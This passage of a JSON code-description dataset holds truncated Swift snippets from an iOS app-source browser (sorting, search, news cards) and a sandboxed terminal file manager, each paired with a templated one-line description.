    "code": "private func createSortAction(title: String, sortOption: SortOption) -> UIAction {\nreturn UIAction(\ntitle: title,\nimage: arrowImage(for: sortOption),\nidentifier: UIAction.Identifier(\"sort\\(title)\"),\nstate: Preferences.currentSortOption == sortOption ? .on : .off,\nhandler: { [weak self] _ in",
    "nl": "Function createSortAction - creates sortaction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3319",
    "code": "private func handleSortOptionSelected(_ sortOption: SortOption) {\nif Preferences.currentSortOption == sortOption {",
    "nl": "Function handleSortOptionSelected - implements handlesortoptionselected functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3320",
    "code": "func arrowImage(for sortOption: SortOption) -> UIImage? {\nlet isAscending = Preferences.currentSortOptionAscending\nlet imageName = isAscending ? \"chevron.up\" : \"chevron.down\"\nreturn sortOption == Preferences.currentSortOption ? UIImage(systemName: imageName) : nil\n}\n\nfunc updateSortOrderImage(for sortOption: SortOption) {",
    "nl": "/ Arrow images for Sort options",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3321",
    "code": "func updateSortOrderImage(for sortOption: SortOption) {\nguard let sortActionsGroup = sortActionsGroup else {",
    "nl": "Function updateSortOrderImage - updates sortorderimage",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3322",
    "code": "func applyFilter() {\nlet sortOption = Preferences.currentSortOption\nlet ascending = Preferences.currentSortOptionAscending\n\nswitch sortOption {",
    "nl": "MARK: - Filtering & Sorting",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3323",
    "code": "private func sortAppsByDate(ascending: Bool) -> [StoreAppsData] {\nreturn apps.sorted { app1, app2 in",
    "nl": "Function sortAppsByDate - implements sortappsbydate functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3324",
    "code": "private func reloadTableWithAnimation() {\nUIView.transition(\nwith: tableView,\nduration: 0.3,\noptions: .transitionCrossDissolve,\nanimations: { self.tableView.reloadData() }",
    "nl": "Function reloadTableWithAnimation - implements reloadtablewithanimation functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3325",
    "code": "private func shouldFilter() -> StoreAppsData? {\nguard let name = highlightAppName,\nlet id = highlightBundleID,\nlet version = highlightVersion,\nlet desc = highlightDescription\nelse {",
    "nl": "MARK: - App Filtering",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3326",
    "code": "private func filterApps(\nfrom apps: [StoreAppsData],\nname: String,\nid: String,\nversion: String,\ndesc: String,\ndevname: String?\n) -> [StoreAppsData] {",
    "nl": "Function filterApps - implements filterapps functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3327",
    "code": "private func loadAppsData() {\nguard let urls = uri else { return }",
    "nl": "MARK: - Data Loading",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3328",
    "code": "private func fetchDataFromURL(\n_ uri: URL,\ncompletion: @escaping ([StoreAppsData], [NewsData], String, String) -> Void\n) {",
    "nl": "Function fetchDataFromURL - implements fetchdatafromurl functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3329",
    "code": "private func processLoadedAppData(\nallApps: [StoreAppsData],\nnewsData: [NewsData],\nwebsite: String,\ntintColor: String\n) {",
    "nl": "Function processLoadedAppData - implements processloadedappdata functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3330",
    "code": "private func applyTintColor(_ tintColor: String) {\nif !tintColor.isEmpty {",
    "nl": "Function applyTintColor - implements applytintcolor functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3331",
    "code": "private func filterAppsIfNeeded() {\nif let filteredApp = shouldFilter() {",
    "nl": "Function filterAppsIfNeeded - implements filterappsifneeded functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3332",
    "code": "private func setupWebsiteTitleMenu(website: String) {\nguard uri.count == 1, !website.isEmpty else { return }",
    "nl": "Function setupWebsiteTitleMenu - sets upwebsitetitlemenu",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3333",
    "code": "private func finishLoading() {\nUIView.transition(\nwith: tableView,\nduration: 0.3,\noptions: .transitionCrossDissolve,\nanimations: {",
    "nl": "Function finishLoading - implements finishloading functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3334",
    "code": "extension SourceAppViewController {\noverride func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {",
    "nl": "MARK: - UITableViewDataSource & UITableViewDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3335",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {\nreturn isFiltering ? filteredApps.count : apps.count\n}\n\noverride func tableView(_: UITableView, heightForRowAt indexPath: IndexPath) -> CGFloat {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3336",
    "code": "override func tableView(_: UITableView, heightForRowAt indexPath: IndexPath) -> CGFloat {\nlet app = isFiltering ? filteredApps[indexPath.row] : apps[indexPath.row]\n\nif let screenshotURLs = app.screenshotURLs,\n!screenshotURLs.isEmpty,\nPreferences.appDescriptionAppearence != 2\n{",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3337",
    "code": "override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet cell = AppTableViewCell(style: .subtitle, reuseIdentifier: \"RoundedBackgroundCell\")\nlet app = isFiltering ? filteredApps[indexPath.row] : apps[indexPath.row]\n\n// Configure cell\nconfigureCell(cell, with: app, at: indexPath)\n\nreturn cell\n}\n",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3338",
    "code": "private func configureCell(_ cell: AppTableViewCell, with app: StoreAppsData, at indexPath: IndexPath) {\ncell.configure(with: app)\ncell.selectionStyle = .none\ncell.backgroundColor = .clear\n\n// Configure button\ncell.getButton.tag = indexPath.row\ncell.getButton.addTarget(self, action: #selector(getButtonTapped(_:)), for: .touchUpInside)\n\n// Add long press gesture",
    "nl": "Function configureCell - implements configurecell functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3339",
    "code": "override func tableView(\n_: UITableView,\ncontextMenuConfigurationForRowAt indexPath: IndexPath,\npoint _: CGPoint\n) -> UIContextMenuConfiguration? {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3340",
    "code": "private func createContextMenu(for app: StoreAppsData) -> UIMenu {\n// Create version actions\nlet versionActions = app.versions?.map { version in",
    "nl": "Function createContextMenu - creates contextmenu",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3341",
    "code": "override func tableView(_: UITableView, titleForHeaderInSection _: Int) -> String? {\nif isFiltering || apps.isEmpty || (highlightAppName != nil) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3342",
    "code": "extension SourceAppViewController: UISearchControllerDelegate, UISearchBarDelegate {\nfunc setupSearchController() {",
    "nl": "MARK: - Search Controller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3343",
    "code": "func setupSearchController() {\nsearchController = UISearchController(searchResultsController: nil)\nsearchController.obscuresBackgroundDuringPresentation = false\nsearchController.hidesNavigationBarDuringPresentation = true\nsearchController.searchResultsUpdater = self\nsearchController.delegate = self\nsearchController.searchBar.placeholder = String.localized(\"SOURCES_APP_VIEW_CONTROLLER_SEARCH_APPS\")\n\nif highlightAppName == nil {",
    "nl": "Function setupSearchController - sets upsearchcontroller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3344",
    "code": "extension SourceAppViewController: UISearchResultsUpdating {\nfunc updateSearchResults(for searchController: UISearchController) {",
    "nl": "MARK: - UISearchResultsUpdating",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3345",
    "code": "func updateSearchResults(for searchController: UISearchController) {\nlet searchText = searchController.searchBar.text ?? \"\"\nfilterContentForSearchText(searchText)\ntableView.reloadData()\n}\n\nprivate func filterContentForSearchText(_ searchText: String) {",
    "nl": "Function updateSearchResults - updates searchresults",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3346",
    "code": "private func filterContentForSearchText(_ searchText: String) {\nlet lowercasedSearchText = searchText.lowercased()\n\nfilteredApps = apps.filter { app in",
    "nl": "Function filterContentForSearchText - implements filtercontentforsearchtext functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3347",
    "code": "private func doesApp(_ app: StoreAppsData, matchSearchText searchText: String) -> Bool {\nlet nameMatch = app.name.lowercased().contains(searchText)\nlet bundleIdMatch = app.bundleIdentifier.lowercased().contains(searchText)\nlet developerMatch = app.developerName?.lowercased().contains(searchText) ?? false\nlet subtitleMatch = app.subtitle?.lowercased().contains(searchText) ?? false\nlet descriptionMatch = app.localizedDescription?.lowercased().contains(searchText) ?? false\n\nreturn nameMatch || bundleIdMatch || developerMatch || subtitleMatch || descriptionMatch\n}\n}",
    "nl": "Function doesApp - implements doesapp functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3348",
    "code": "struct CardContextMenuView: View {\n// MARK: - Properties\n\n@Environment(\\.dismiss) var dismiss\nlet news: NewsData\n\nprivate enum Constants {",
    "nl": "MARK: - CardContextMenuView",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/CardContextMenuView.swift",
    "code_type": "struct"
  },
  {
    "id": "3349",
    "code": "private enum Constants {\nstatic let imageHeight: CGFloat = 250\nstatic let cornerRadius: CGFloat = 12\nstatic let containerCornerRadius: CGFloat = 16\nstatic let buttonCornerRadius: CGFloat = 10\nstatic let buttonIconPadding: CGFloat = 10\n\nstatic let stackSpacing: CGFloat = 12\nstatic let contentSpacing: CGFloat = 16\n",
    "nl": "enum Constants - implements functionality related to constants",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/CardContextMenuView.swift",
    "code_type": "enum"
  },
  {
    "id": "3350",
    "code": "private func renderHeaderImage() -> some View {\nif news.imageURL != nil {",
    "nl": "Function renderHeaderImage - implements renderheaderimage functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/CardContextMenuView.swift",
    "code_type": "function"
  },
  {
    "id": "3351",
    "code": "private func renderContentSection() -> some View {\nVStack(alignment: .leading, spacing: Constants.contentSpacing) {",
    "nl": "Function renderContentSection - implements rendercontentsection functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/CardContextMenuView.swift",
    "code_type": "function"
  },
  {
    "id": "3352",
    "code": "private func renderBackButton() -> some View {\nButton {",
    "nl": "Function renderBackButton - implements renderbackbutton functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/CardContextMenuView.swift",
    "code_type": "function"
  },
  {
    "id": "3353",
    "code": "extension View {\n/// Cross-platform compatible font weight modifier\nfunc compatFontWeight(_ weight: Font.Weight) -> some View {",
    "nl": "MARK: - View Extensions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/CardContextMenuView.swift",
    "code_type": "extension"
  },
  {
    "id": "3354",
    "code": "func compatFontWeight(_ weight: Font.Weight) -> some View {\nif #available(iOS 16.0, *) {",
    "nl": "/ Cross-platform compatible font weight modifier",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/CardContextMenuView.swift",
    "code_type": "function"
  },
  {
    "id": "3355",
    "code": "struct NewsCardContainerView: View {\n// MARK: - Properties\n\n@Binding var isSheetPresented: Bool\nvar news: NewsData\n@Namespace private var namespace\n\nlet uuid = UUID().uuidString\n\n// MARK: - Body",
    "nl": "MARK: - NewsCardContainerView",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardContainerView.swift",
    "code_type": "struct"
  },
  {
    "id": "3356",
    "code": "extension View {\n/// Adds a context menu preview specifically for news items\n/// with URL opening capabilities when available\nfunc compactContentMenuPreview(news: NewsData) -> some View {",
    "nl": "MARK: - View Extensions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardContainerView.swift",
    "code_type": "extension"
  },
  {
    "id": "3357",
    "code": "func compactContentMenuPreview(news: NewsData) -> some View {\nif #available(iOS 16.0, *) {",
    "nl": "/ Adds a context menu preview specifically for news items / with URL opening capabilities when available",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardContainerView.swift",
    "code_type": "function"
  },
  {
    "id": "3358",
    "code": "struct NewsCardView: View {\n// MARK: - Properties\n\nvar news: NewsData\n\nprivate enum Constants {",
    "nl": "MARK: - NewsCardView",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardView.swift",
    "code_type": "struct"
  },
  {
    "id": "3359",
    "code": "private enum Constants {\nstatic let cardWidth: CGFloat = 250\nstatic let cardHeight: CGFloat = 150\nstatic let cornerRadius: CGFloat = 12\nstatic let blurOpacity: Double = 0.97\nstatic let gradientOpacity: Double = 0.7\nstatic let borderOpacity: Double = 0.15\nstatic let borderWidth: CGFloat = 2\nstatic let placeholderOpacity: Double = 0.2\nstatic let animationDuration: Double = 0.3",
    "nl": "enum Constants - implements functionality related to constants",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardView.swift",
    "code_type": "enum"
  },
  {
    "id": "3360",
    "code": "private func renderBackgroundImage() -> some View {\nif news.imageURL != nil {",
    "nl": "Function renderBackgroundImage - implements renderbackgroundimage functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardView.swift",
    "code_type": "function"
  },
  {
    "id": "3361",
    "code": "private func renderBlurOverlay() -> some View {\nVariableBlurView()\n.opacity(Constants.blurOpacity)\n.frame(maxWidth: .infinity, maxHeight: .infinity)\n.rotationEffect(.degrees(180))\n.padding(.top, Constants.topPadding)\n}\n\nprivate func renderTitleContent() -> some View {",
    "nl": "Function renderBlurOverlay - implements renderbluroverlay functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardView.swift",
    "code_type": "function"
  },
  {
    "id": "3362",
    "code": "private func renderTitleContent() -> some View {\nVStack {",
    "nl": "Function renderTitleContent - implements rendertitlecontent functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardView.swift",
    "code_type": "function"
  },
  {
    "id": "3363",
    "code": "struct NewsCardsScrollView: View {\n// MARK: - Properties\n\n@State private var newsData: [NewsData]\n@State private var sheetStates: [String: Bool] = [:]\n@State private var isSheetPresented = false\n\nprivate enum Constants {",
    "nl": "MARK: - NewsCardsScrollView",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardsScrollView.swift",
    "code_type": "struct"
  },
  {
    "id": "3364",
    "code": "private enum Constants {\nstatic let cardSpacing: CGFloat = 10\n}\n\n// MARK: - Initialization\n\ninit(newsData: [NewsData]) {",
    "nl": "enum Constants - implements functionality related to constants",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardsScrollView.swift",
    "code_type": "enum"
  },
  {
    "id": "3365",
    "code": "private func createSheetBinding(for newsItem: NewsData) -> Binding<Bool> {\nreturn Binding(\nget: { sheetStates[newsItem.identifier] ?? false },",
    "nl": "MARK: - Helper Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardsScrollView.swift",
    "code_type": "function"
  },
  {
    "id": "3366",
    "code": "class TerminalFileManager {\n// MARK: - Singleton\n\nstatic let shared = TerminalFileManager()\n\nprivate init() {}",
    "nl": "/ TerminalFileManager provides file system operations for the Terminal interface / This allows users to navigate, view, and manipulate files within the app sandbox",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift",
    "code_type": "class"
  },
  {
    "id": "3367",
    "code": "func changeDirectory(to path: String) -> Result<String, Error> {\nlet targetURL: URL\n\nif path.starts(with: \"/\") {",
    "nl": "MARK: - Directory Navigation / Change the current working directory / - Parameter path: The path to change to (absolute or relative) / - Returns: Result with new path or error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "3368",
    "code": "func getCurrentDirectory() -> String {\nreturn currentDirectory.path\n}\n\n// MARK: - File Operations\n\n/// List files in the current directory\n/// - Parameter showHidden: Whether to show hidden files (starting with .)\n/// - Returns: Result with array of file information or error\nfunc listFiles(showHidden: Bool = false) -> Result<[FileInfo], Error> {",
    "nl": "/ Get the current working directory / - Returns: The path of the current directory",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "3369",
    "code": "func listFiles(showHidden: Bool = false) -> Result<[FileInfo], Error> {\ndo {",
    "nl": "MARK: - File Operations / List files in the current directory / - Parameter showHidden: Whether to show hidden files (starting with .) / - Returns: Result with array of file information or error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "3370",
    "code": "func createDirectory(name: String) -> Result<String, Error> {\nlet newDirectoryURL = currentDirectory.appendingPathComponent(name)\n\ndo {",
    "nl": "/ Create a new directory / - Parameter name: Name of the directory to create / - Returns: Result with success message or error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "3371",
    "code": "func delete(name: String) -> Result<String, Error> {\nlet itemURL = currentDirectory.appendingPathComponent(name)\n\ndo {",
    "nl": "/ Delete a file or directory / - Parameter name: Name of the file or directory to delete / - Returns: Result with success message or error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "3372",
    "code": "func move(sourceName: String, destinationName: String) -> Result<String, Error> {\nlet sourceURL = currentDirectory.appendingPathComponent(sourceName)\n\n// Determine if destination is a path or just a new name\nlet destinationURL: URL\nif destinationName.contains(\"/\") {",
    "nl": "/ Move or rename a file or directory / - Parameters: /   - sourceName: Name of the source file or directory /   - destinationName: New name or path for the file or directory / - Returns: Result with success message or error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "3373",
    "code": "func copy(sourceName: String, destinationName: String) -> Result<String, Error> {\nlet sourceURL = currentDirectory.appendingPathComponent(sourceName)\n\n// Determine if destination is a path or just a new name\nlet destinationURL: URL\nif destinationName.contains(\"/\") {",
    "nl": "/ Copy a file or directory / - Parameters: /   - sourceName: Name of the source file or directory /   - destinationName: New name or path for the copy / - Returns: Result with success message or error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "3374",
    "code": "func readFile(name: String) -> Result<String, Error> {\nlet fileURL = currentDirectory.appendingPathComponent(name)\n\ndo {",
    "nl": "MARK: - File Content Operations / Read the contents of a text file / - Parameter name: Name of the file to read / - Returns: Result with file contents or error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "3375",
    "code": "func writeFile(name: String, contents: String, append: Bool = false) -> Result<String, Error> {\nlet fileURL = currentDirectory.appendingPathComponent(name)\n\ndo {",
    "nl": "/ Write text to a file / - Parameters: /   - name: Name of the file to write /   - contents: Text contents to write /   - append: Whether to append to existing file or overwrite / - Returns: Result with success message or error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "3376",
    "code": "func getFileInfo(name: String) -> Result<FileInfo, Error> {\nlet itemURL = currentDirectory.appendingPathComponent(name)\n\ndo {",
    "nl": "/ Get information about a file or directory / - Parameter name: Name of the file or directory / - Returns: Result with file information or error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "3377",
    "code": "func findFiles(pattern: String, recursive: Bool = false) -> Result<[String], Error> {\ndo {",
    "nl": "/ Search for files matching a pattern / - Parameters: /   - pattern: The search pattern (supports * and ? wildcards) /   - recursive: Whether to search recursively in subdirectories / - Returns: Result with array of matching file paths or error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "3378",
    "code": "func getPermissions(name: String) -> Result<String, Error> {\nlet itemURL = currentDirectory.appendingPathComponent(name)\n\ndo {",
    "nl": "/ Get file permissions / - Parameter name: Name of the file or directory / - Returns: Result with permissions string (e.g., \"rwxr-xr--\") or error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "3379",
    "code": "func setPermissions(name: String, permissions: Int) -> Result<String, Error> {\nlet itemURL = currentDirectory.appendingPathComponent(name)\n\ndo {",
    "nl": "/ Set file permissions / - Parameters: /   - name: Name of the file or directory /   - permissions: Octal permissions value (e.g., 0o755) / - Returns: Result with success message or error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift",
    "code_type": "function"
  },
  {
    "id": "3380",
    "code": "struct FileInfo {\n/// Name of the file or directory\nlet name: String\n\n/// Full path to the file or directory\nlet path: String\n\n/// Whether the item is a directory\nlet isDirectory: Bool\n",
    "nl": "MARK: - Supporting Types / Represents information about a file or directory",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift",
    "code_type": "struct"
  },
  {
    "id": "3381",
    "code": "class CommandHistory {\nprivate var commands: [String] = []\nprivate var currentIndex: Int = -1\nprivate let maxHistorySize = 100\nprivate let logger = Debug.shared\n\nfunc addCommand(_ command: String) {",
    "nl": "class CommandHistory - implements functionality related to command history",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandHistory.swift",
    "code_type": "class"
  },
  {
    "id": "3382",
    "code": "func addCommand(_ command: String) {\n// Don't add empty commands\nlet trimmedCommand = command.trimmingCharacters(in: .whitespacesAndNewlines)\nguard !trimmedCommand.isEmpty else {",
    "nl": "Function addCommand - implements addcommand functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandHistory.swift",
    "code_type": "function"
  },
  {
    "id": "3383",
    "code": "func getPreviousCommand() -> String? {\nguard !commands.isEmpty, currentIndex >= 0 else {",
    "nl": "Function getPreviousCommand - retrieves previouscommand",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandHistory.swift",
    "code_type": "function"
  },
  {
    "id": "3384",
    "code": "func getNextCommand() -> String? {\nguard !commands.isEmpty, currentIndex < commands.count - 1 else {",
    "nl": "Function getNextCommand - retrieves nextcommand",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandHistory.swift",
    "code_type": "function"
  },
  {
    "id": "3385",
    "code": "func resetIndex() {\ncurrentIndex = commands.count - 1\n}\n\nfunc clearHistory() {",
